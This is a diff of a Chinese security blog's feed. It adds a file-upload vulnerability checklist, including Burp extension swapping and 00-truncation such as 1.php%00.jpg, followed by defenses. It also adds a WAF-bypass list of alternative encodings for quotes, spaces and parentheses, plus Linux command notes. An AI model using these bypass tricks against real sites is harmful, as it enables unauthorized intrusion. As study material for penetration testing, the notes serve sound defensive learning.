class="line">首先判断是程序员自己写的上传点，还是编辑器的上传功能</div><div class="line"></div><div class="line">如果是编辑器上传功能，goolge当前编辑器的漏洞</div><div class="line"></div><div class="line"></div><div class="line">如果是程序员写的上传点</div><div class="line"></div><div class="line">上传一个正常的jpg图片 查看上传点是否可用</div><div class="line"></div><div class="line">上传一个正常的jpg图片，burp拦截，修改后缀为php (可以检测前端验证 MIME检测 文件内容检测 后缀检测）</div><div class="line"></div><div class="line">上传一个正常的jpg图片，burp拦截， <span class="number">00</span>截断 <span class="number">1.</span>php%<span class="number">00.</span>jpg</div><div class="line"></div><div class="line">判断服务器是什么类型，web服务器程序，是什么类型，版本号多少</div><div class="line"></div><div class="line">利用解析漏洞</div><div class="line"></div><div class="line">防御：：：</div><div class="line"></div><div class="line">上传文件的存储目录禁用执行权限</div><div class="line"></div><div class="line">文件后缀白名单，注意<span class="number">0x00</span>截断攻击（PHP更新到最新版本）</div><div class="line"></div><div class="line">不能有本地文件包含漏洞</div><div class="line"></div><div class="line">及时修复Web上传代码（重要）</div><div class="line"></div><div class="line">升级Web Server</div></pre></td></tr></table></figure>
+<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="Upload Attack Framework">1. Upload Attack Framework</a></p>
+<p><a href="http://www.yyipu.com/index.php/2017/04/26/49.html" target="_blank" rel="external">2. web中的条件竞争漏洞</a></p>
+<p><a href="https://masterxsec.github.io/2017/04/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%80%BB%E7%BB%93/" target="_blank" rel="external">3. 文件上传总结</a></p>
+<p><a href="http://www.joychou.org/index.php/web/truncated.html" target="_blank" rel="external">4. 截断在文件包含和上传中的利用</a></p>
+<p><a href="http://www.jianshu.com/p/eba198dd30ef" target="_blank" rel="external">5. 文件上传漏洞</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;1-概述&quot;&gt;&lt;a href=&quot;#1-概述&quot; class=&quot;headerlink&quot; title=&quot;1. 概述&quot;&gt;&lt;/a&gt;1. 概述&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;文件上传漏洞可以说是日常渗透测试中用得最多的一个漏洞，用它获得服务器权限最快最直接。在Web程序中，经常需要用到文件上传的功能。如用户或者管理员上传图片，或者其它文件。如果没有限制上传类型或者限制不严格被绕过，就有可能造成文件上传漏洞。如果上传了可执行文件或者网页脚本，就会导致网站被控制甚至服务器沦陷。，复杂一点的情况是配合 Web Server的解析漏洞来获取控制权或结合文件包含漏洞。此篇文章主要分三部分：总结一些常见的上传文件校验方式，以及绕过校验的各种姿势，最后对此漏洞提几点防护建议。
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;2-上传检测流程&quot;&gt;&lt;a href=&quot;#2-上传检测流程&quot; class=&quot;headerlink&quot; title=&quot;2. 上传检测流程&quot;&gt;&lt;/a&gt;2. 上传检测流程&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;通常一个文件以HTTP协议进行上传时，将以POST请求发送至Web服务器，Web服务器接收到请求并同意后，用户与Web服务器将建立连接，并传输数据。一般文件上传过程中将会经过如下几个检测步骤：
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;http://ofrdce5qv.bkt.clouddn.com/1.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+    
+    </summary>
+    
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>bypass waf(关键字符替换)</title>
+    <link href="http://yoursite.com/2017/04/06/bypass-waf-%E5%85%B3%E9%94%AE%E5%AD%97%E7%AC%A6%E6%9B%BF%E6%8D%A2/"/>
+    <id>http://yoursite.com/2017/04/06/bypass-waf-关键字符替换/</id>
+    <published>2017-04-06T09:47:46.000Z</published>
+    <updated>2017-04-06T09:51:23.278Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-字母a"><a href="#0x01-字母a" class="headerlink" title="0x01 字母a"></a>0x01 字母a</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0000</span><span class="xml"></span></div><div class="line"><span class="perl">%u0041</span><span class="xml"></span></div><div class="line"><span class="perl">%u0061</span><span class="xml"></span></div><div class="line"><span class="perl">%u00aa</span><span class="xml"></span></div><div class="line"><span class="perl">%u00e2</span><span class="xml"></span></div><div class="line">单引号：</div><div class="line"><span class="perl">%u0027</span><span class="xml"></span></div><div class="line"><span class="perl">%u02b9</span><span class="xml"></span></div><div class="line"><span class="perl">%u02bc</span><span class="xml"></span></div><div class="line"><span class="perl">%u02c8</span><span class="xml"></span></div><div class="line"><span class="perl">%u2032</span><span class="xml"></span></div><div class="line"><span class="perl">%uff07</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%27</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a7</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a7</span><span class="xml"></span></div></pre></td></tr></table></figure>
+<h3 id="0x02-空白"><a href="#0x02-空白" class="headerlink" title="0x02 空白"></a>0x02 空白</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0020</span><span class="xml"></span></div><div class="line"><span class="perl">%uff00</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%20</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a0</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a0</span><span class="xml"></span></div></pre></td></tr></table></figure>
+<h3 id="0x03-左括号"><a href="#0x03-左括号" class="headerlink" title="0x03 左括号("></a>0x03 左括号(</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0028</span><span class="xml"></span></div><div class="line"><span class="perl">%uff08</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%28</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a8</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a8</span><span class="xml"></span></div></pre></td></tr></table></figure>
+<h3 id="0x04-右括号"><a href="#0x04-右括号" class="headerlink" title="0x04 右括号)"></a>0x04 右括号)</h3><figure class="highlight mojolicious"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="xml"></span><span class="perl">%u0029</span><span class="xml"></span></div><div class="line"><span class="perl">%uff09</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%29</span><span class="xml"></span></div><div class="line"><span class="perl">%c0%a9</span><span class="xml"></span></div><div class="line"><span class="perl">%e0%80%a9</span><span class="xml"></span></div></pre></td></tr></table></figure>
+<p>###参考链接<br><a href="http://www.lucaroot.pw/archives/50/" target="_blank" rel="external">转载-享受孤独</a></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-字母a&quot;&gt;&lt;a href=&quot;#0x01-字母a&quot; class=&quot;headerlink&quot; title=&quot;0x01 字母a&quot;&gt;&lt;/a&gt;0x01 字母a&lt;/h3&gt;&lt;figure class=&quot;highlight mojolicious&quot;&gt;&lt;table&gt;&lt;tr&gt;
+    
+    </summary>
+    
+    
+      <category term="waf" scheme="http://yoursite.com/tags/waf/"/>
+    
+  </entry>
   
   <entry>
     <title>ZCTF线下赛php弱类型</title>
@@ -386,7 +548,7 @@ cd /root
     <link href="http://yoursite.com/2016/11/17/Linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4%E4%BD%BF%E7%94%A8%E6%80%BB%E7%BB%93/"/>
     <id>http://yoursite.com/2016/11/17/Linux常用命令使用总结/</id>
     <published>2016-11-17T05:56:23.000Z</published>
-    <updated>2016-12-06T05:36:56.938Z</updated>
+    <updated>2017-05-12T08:05:29.057Z</updated>
     
     <content type="html"><![CDATA[<h3 id="1-strings命令"><a href="#1-strings命令" class="headerlink" title="1 strings命令"></a>1 strings命令</h3><p>strings命令在对象文件或二进制文件中查找可打印的字符串。字符串是4个或更多可打印的任意序列，以换行符或空字符结束。strings命令对识别随机对象文件很有用。</p>
 <p>语法：</p>
@@ -461,6 +623,14 @@ wc -w flag.dic
 <p>根据文件权限/所有权进行匹配<br>当前目录下搜索出权限为777的文件<code>find . -type f -perm 777</code></p>
 <p>找出当前目录用户tom拥有的所有文件<code>find . -type f -user tome</code></p>
 <h3 id="14-在Linux文件中权限的问题"><a href="#14-在Linux文件中权限的问题" class="headerlink" title="14 在Linux文件中权限的问题"></a>14 在Linux文件中权限的问题</h3><p><code>r(Read，读取)：对文件而言，具有读取文件内容的权限；对目录来说，具有浏览目 录的权限。</code><br><code>w(Write,写入)：对文件而言，具有新增、修改文件内容的权限；对目录来说，具有删除、移动目录内文件的权限。</code><br><code>x(eXecute，执行)：对文件而言，具有执行文件的权限；对目录了来说该用户具有进入目录的权限。</code><br><code>s或S（SUID）：可执行的稳健搭配这个权限，便能得到特权，任意存取改文件的所有者能使用全部系统资源</code></p>
+<h3 id="15-wget命令"><a href="#15-wget命令" class="headerlink" title="15 wget命令"></a>15 wget命令</h3><p><code>wget -r -p -np -k http://xxx.com/xxx</code></p>
+<ul>
+<li>r, –recursive（递归）specify recursive download.（指定递归下载）</li>
+<li>p, –page-requisites（页面必需元素） get all images, etc. needed to display HTML page.（下载所有的图片等页面显示所需的内容）</li>
+<li>np, –no-parent（不追溯至父级） don’t ascend to the parent directory.</li>
+<li>k, –convert-links（转换链接） make links in downloaded HTML point to local files.（将下载的HTML页面中的链接转换为相对链接即本地链接）</li>
+</ul>
+<p>例：<code>wget -r -p -np -k http://jdrops.dropsec.xyz/</code></p>
 ]]></content>
     
     <summary type="html">
@@ -1793,145 +1963,6 @@ print(&quot;{}=&gt;{}&quot;.format(check_url,redirects_url))
     
     
       <category term="python运维" scheme="http://yoursite.com/tags/python%E8%BF%90%E7%BB%B4/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>HTML 20/80关键知识</title>
-    <link href="http://yoursite.com/2016/10/15/HTML-20-80%E5%85%B3%E9%94%AE%E7%9F%A5%E8%AF%86/"/>
-    <id>http://yoursite.com/2016/10/15/HTML-20-80关键知识/</id>
-    <published>2016-10-15T14:55:53.000Z</published>
-    <updated>2017-03-12T14:08:31.956Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="HTML-20-80关键知识"><a href="#HTML-20-80关键知识" class="headerlink" title="HTML 20/80关键知识"></a>HTML 20/80关键知识</h1><h3 id="1-网页结构"><a href="#1-网页结构" class="headerlink" title="1 网页结构"></a>1 网页结构</h3><ul>
-<li>HTML：专注于网页的结构</li>
-<li>CSS ：用于修饰网页的样式</li>
-<li>Javascript:赋予网页的各种功能（数据存储，通讯，反数据爬取等）<h3 id="2-静态网页的概念"><a href="#2-静态网页的概念" class="headerlink" title="2 静态网页的概念"></a>2 静态网页的概念</h3>拥有HTML和CSS（网页的结构和样式），但没有JavaScript（没有任何数据的传输，比如注册网站或登录后台要传送数据给数据库等）<a id="more"></a>
-<h3 id="3-HTML"><a href="#3-HTML" class="headerlink" title="3 HTML"></a>3 HTML</h3>由标签组成，因此是一种标记语言，包含100多种标签，其中最常用的有10中</li>
-</ul>
-<p><strong><em>标签：</em></strong>一般由开始标签+内容+结束标签组成，如：</p>
-<pre><code>&lt;div&gt; hello,word&lt;/div&gt;
-</code></pre><p><strong><em>要注意的是，在HTML中，并不是所有的标签都是结束标签</em></strong></p>
-<p>比如img标签：</p>
-<pre><code>&lt;img src=&quot;images/001.jpg&quot; alt=&quot;蝴蝶兰&quot;&gt;
-</code></pre><p><strong><em>搭配的标签</em></strong></p>
-<ul>
-<li>用class属性把正确的样式赋予标签，用href属性在标签内引入链接</li>
-<li>每个标签带有多个属性，其中有必要属性，如img标签的src属性（值为URL，未定显示图像的URL）和alt属性（值为text，规定显示图像的替代文本）</li>
-</ul>
-<p><strong><em>标签的嵌套</em></strong></p>
-<ul>
-<li>实质是包含关系</li>
-<li>内层标签和外层标签是父子关系</li>
-<li>同一层标签是兄弟关系</li>
-</ul>
-<p><strong><em>网页设计的结构（要与html结构区别开，这是不同的定义）</em></strong></p>
-<ul>
-<li>Header（布置导航，目录）</li>
-<li>Content(文章，博客）</li>
-<li>Footer(联系方式等）</li>
-</ul>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h1 id=&quot;HTML-20-80关键知识&quot;&gt;&lt;a href=&quot;#HTML-20-80关键知识&quot; class=&quot;headerlink&quot; title=&quot;HTML 20/80关键知识&quot;&gt;&lt;/a&gt;HTML 20/80关键知识&lt;/h1&gt;&lt;h3 id=&quot;1-网页结构&quot;&gt;&lt;a href=&quot;#1-网页结构&quot; class=&quot;headerlink&quot; title=&quot;1 网页结构&quot;&gt;&lt;/a&gt;1 网页结构&lt;/h3&gt;&lt;ul&gt;
-&lt;li&gt;HTML：专注于网页的结构&lt;/li&gt;
-&lt;li&gt;CSS ：用于修饰网页的样式&lt;/li&gt;
-&lt;li&gt;Javascript:赋予网页的各种功能（数据存储，通讯，反数据爬取等）&lt;h3 id=&quot;2-静态网页的概念&quot;&gt;&lt;a href=&quot;#2-静态网页的概念&quot; class=&quot;headerlink&quot; title=&quot;2 静态网页的概念&quot;&gt;&lt;/a&gt;2 静态网页的概念&lt;/h3&gt;拥有HTML和CSS（网页的结构和样式），但没有JavaScript（没有任何数据的传输，比如注册网站或登录后台要传送数据给数据库等）
-    
-    </summary>
-    
-    
-      <category term="python web开发" scheme="http://yoursite.com/tags/python-web%E5%BC%80%E5%8F%91/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>在python3中操作MongoDB数据库</title>
-    <link href="http://yoursite.com/2016/10/07/%E5%9C%A8python3%E4%B8%AD%E6%93%8D%E4%BD%9CMongoDB%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
-    <id>http://yoursite.com/2016/10/07/在python3中操作MongoDB数据库/</id>
-    <published>2016-10-07T04:21:28.000Z</published>
-    <updated>2016-10-07T05:34:16.172Z</updated>
-    
-    <content type="html"><![CDATA[<p><img src="http://i1.piimg.com/567571/066efee756c1d9e4.jpg" alt=""></p>
-<p>首先了解一下MongoDB中存储数据的一些概念<br><img src="http://i1.piimg.com/567571/959fb373e2913f71.png" alt=""><br><a id="more"></a><br>对于数据路的操作无外乎对表的，集合的操作和对数据的操作。在python中进行下面的所有的操作前，都必须有这几条语句：</p>
-<pre><code>import pymongo
-#与mongodb服务器进行连接
-client = pymongo.MongoClient(&apos;localhost&apos;, 27017)
-ceshi = client[&apos;ceshi&apos;]  #创建一个名为ceshi的数据库
-#若直接连接已有的数据库，类似db = connection[&quot;ganji&quot;]
-item_info = ceshi[&apos;item_info&apos;]#建名为item_info的集合（表），同建立数据库形式一样
-</code></pre><h3 id="1-id"><a href="#1-id" class="headerlink" title="1 _id"></a>1 _id</h3><p>MongoDB中存储的文档必须有一个”_id”键。这个键的值可以是任何类型的，默认是一个Objectld对象。在一个集合里面，每一个集合都有唯一的”_id”值，来确保集合里面每一个文档都被唯一的标识，如果有两个集合的话，两个集合可以都有一个值为”123”的”_id”的键，但是每一个集合只能有一个”_id”是123的文档。</p>
-<h3 id="2-插入、删除、更新记录（文档）"><a href="#2-插入、删除、更新记录（文档）" class="headerlink" title="2 插入、删除、更新记录（文档）"></a>2 插入、删除、更新记录（文档）</h3><pre><code>（1）对建好的集合中插入数据，用insert(),insert_one()函数
-    users.insert_one({&quot;url&quot;:item_link})#一般要表前加上数据库的名字
-    ceshi.users.insert_one({&quot;url&quot;:item_link})
-(2)删除集合中的文档，用remove()函数，删除后的文档无法恢复
-    ceshi.user.remove() 表示删除集合里的所有记录
-    ceshi.user.remove({&apos;yy&apos;:5}) #表删除yy=5的记录
-
-    id = ceshi.users.find_one({&quot;name&quot;:&quot;user1&quot;})[&quot;_id&quot;]
-    ceshi.users.remove(id)#找到name=user1的记录，并根据记录的id删除该记录
-（3）更新记录用update()函数
-    db.collection.update( criteria, objNew, upsert, multi )
-    criteria: 需要被更新的条件表达式（update的查询条件，类似sql update查询内的where后面的）
-    objNew: 更新表达式（update的对象和一些更新的操作符（如$,$set..）等
-    upsert: 如目标记录不存在，是否插入新文档（默认为false，不插入）
-    multi: 是否更新多个文档（默认为false，只更新找到的第一条记录，若为ture，就把按条件查出来的多条记录全部更新）
-
-    ceshi.users.update({&apos;gid&apos;:last_gid, &apos;time&apos;:l_date}, {&apos;$set&apos;:{&apos;gid&apos;:last_gid}, &apos;$set&apos;:{&apos;time&apos;:l_date}, &apos;$addToSet&apos;:{&apos;categories&apos;:category_data}}, upsert=True)
-    #上式表示添加&apos;categories&apos;字段到gid=last_gid,time=l_date的这条记录中。
-</code></pre><h3 id="3-数据的查询（重点）"><a href="#3-数据的查询（重点）" class="headerlink" title="3 数据的查询（重点）"></a>3 数据的查询（重点）</h3><p>基本上用find()函数进行查询，$lt/$lte/$gt/$gte/$ne，依次等价于&lt; / &lt;= / &gt; / &gt;=/ !=。（l表示less g表示greater e表示equal n表示not  ）</p>
-<pre><code>（1）查询显示符合条件的记录
-    #查询age小于15的
-      for u in ceshi.users.find({&quot;age:{&quot;$lt&quot;:15}):print u
-    # 查询 name 等于 user8 的
-      for u in ceshi.users.find({&quot;name&quot;:&quot;user8&quot;}): print u
-
-    #获取查询的一个记录（注意用find_one()而不是find())
-    u2 = ceshi.users.find_one({&quot;name&quot;:&quot;user9&quot;}) # 查不到时返回 None
-    print u2
-(2)多条件进行查询
-    # select * from users where name = &apos;user3&apos; and age &gt; 12 and age &lt; 15
-     for u in db.users.find({&apos;age&apos;: {&apos;$gt&apos;: 12, &apos;$lt&apos;: 15}, &apos;name&apos;: &apos;user3&apos;}): print u
-# select * from users where name = &apos;user1&apos; and age = 21
-     for u in db.users.find({&quot;age&quot;:21, &quot;name&quot;:&quot;user1&quot;}): print u
-
-    *记住，使用find（）函数时，对应的条件都是以字典的形式表示｛&apos;age&apos;:{&apos;$gt&apos;:12},&apos;xx&apos;:&apos;xx&apos;｝，有多个条件时，都放在一个{}内
-（3）计数，用count()函数
-    # select count(*) from users  查询users表中所有的记录的个数   
-        print(db.users.find().count()) 
-    # select count(*) from users where age &gt; 30 查询users表中age&gt;30的记录
-        print(db.users.find({&quot;age&quot;:{&quot;$gt&quot;:30}}).count())
-（4）从第几行开始读取(SLICE)，读取多少行(LIMIT) 
-    #从第2行开始读取，读取3行记录
-    for u in db.users.find().skip(2).limit(3): print u
-</code></pre><h3 id="4-导入json格式数据到Mongodb中"><a href="#4-导入json格式数据到Mongodb中" class="headerlink" title="4 导入json格式数据到Mongodb中"></a>4 导入json格式数据到Mongodb中</h3><ol>
-<li><p>首先运行 mongo shell在数据库中创建一个 collection —— db.createCollection(‘the_name’)</p>
-</li>
-<li><p>接下来直接在终端/命令行中使用命令导入 json 格式的数据 —— mongoimport -d database_name -c collection_name F:\sample.json</p>
-</li>
-</ol>
-<p>以管理员权限用cd命令进入MongoDB安装目录中bin目录下，运行如下命令：<br>F:MongoDB&gt;bin&gt; mongoimport -d 数据库名字 -c 集合名字 –type 文件类型 –file 文件路径  –upsert<br>其中，–upsert字段的意思是以插入(insert)或者更新(update)的方式来导入数据</p>
-<pre><code>F:\MongoDB\bin&gt;mongoimport -d ceshi -c item_infoX --type json --file F:\sample.json --upsert
-    2016-10-06T14:55:27.643+0800    connected to: localhost
-    2016-10-06T14:55:30.641+0800    [#####...................] ceshi.item_infoX     7.56MB/34.2MB (22.1%)
-    2016-10-06T14:55:33.639+0800    [##########..............] ceshi.item_infoX     15.3MB/34.2MB (44.9%)
-    2016-10-06T14:55:36.639+0800    [################........] ceshi.item_infoX     23.3MB/34.2MB (68.1%)
-    2016-10-06T14:55:39.640+0800    [#####################...] ceshi.item_infoX     31.3MB/34.2MB (91.5%)
-    2016-10-06T14:55:40.761+0800    [########################] ceshi.item_infoX     34.2MB/34.2MB (100.0%)
-    2016-10-06T14:55:40.762+0800    imported 86850 documents
-</code></pre><h3 id="5-未完待续"><a href="#5-未完待续" class="headerlink" title="5 未完待续"></a>5 未完待续</h3>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;&lt;img src=&quot;http://i1.piimg.com/567571/066efee756c1d9e4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
-&lt;p&gt;首先了解一下MongoDB中存储数据的一些概念&lt;br&gt;&lt;img src=&quot;http://i1.piimg.com/567571/959fb373e2913f71.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;
-    
-    </summary>
-    
-    
-      <category term="python3 数据库" scheme="http://yoursite.com/tags/python3-%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
     
   </entry>
   
